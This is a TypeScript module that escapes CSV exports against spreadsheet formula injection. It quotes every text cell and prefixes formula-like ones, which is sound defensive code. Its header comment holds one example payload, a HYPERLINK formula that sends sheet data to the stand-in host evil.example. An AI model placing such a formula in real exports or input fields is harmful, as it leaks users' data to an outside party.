/**
 * CSV that is safe to open in a spreadsheet.
 *
 * Exported analytics contain text people typed themselves (their names), and
 * a spreadsheet treats a cell that starts with `=`, `+`, `-` or `@` as a
 * formula. A member called `=HYPERLINK("https://evil.example?"&A1,"Open")`
 * would otherwise turn the export into a link that sends the sheet's data
 * away (CSV / formula injection, OWASP).
 *
 * The OWASP mitigation, applied to every text cell:
 *
 * - a cell whose first non-blank character could start a formula - `=`, `+`,
 *   `-`, `@`, their full-width forms, or a leading tab or carriage return - is
 *   prefixed with `'`, which spreadsheets read as "this is text";
 * - every text cell is quoted, with embedded quotes doubled, so commas, quotes
 *   and line breaks inside a value cannot end the cell early (RFC 4180).
 *
 * Numbers are written as numbers: a finite number cannot carry a formula,
 * and a negative one must stay a number, not become the text "'-3".
 */

export type CsvCell = string | number | boolean | null | undefined;

/** Characters that make Excel, LibreOffice or Google Sheets start a formula. */
const FORMULA_START = /^[=+\-@\uFF1D\uFF0B\uFF0D\uFF20]/;

/**
 * Leading whitespace a spreadsheet may skip before it looks for a formula.
 * (`\s` includes the no-break and ideographic spaces.)
 */
const LEADING_BLANK = /^\s+/;

/** True when a spreadsheet could read this text as a formula. */
export function isFormulaLike(text: string): boolean {
  if (/^[\t\r]/.test(text)) return true;
  return FORMULA_START.test(text.replace(LEADING_BLANK, ''));
}

/** One cell, escaped. */
export function escapeCsvCell(value: CsvCell): string {
  if (value === null || value === undefined) return '';
  if (typeof value === 'number') return Number.isFinite(value) ? String(value) : '';
  if (typeof value === 'boolean') return value ? 'true' : 'false';

  const text = isFormulaLike(value) ? `'${value}` : value;
  return `"${text.replace(/"/g, '""')}"`;
}

/**
 * Rows into a CSV document: CRLF line ends (RFC 4180) and a UTF-8 byte order
 * mark, without which Excel reads "Zoë" as "ZoÃ«".
 */
export function toCsv(rows: readonly (readonly CsvCell[])[]): string {
  return `\uFEFF${rows.map((row) => row.map(escapeCsvCell).join(',')).join('\r\n')}\r\n`;
}
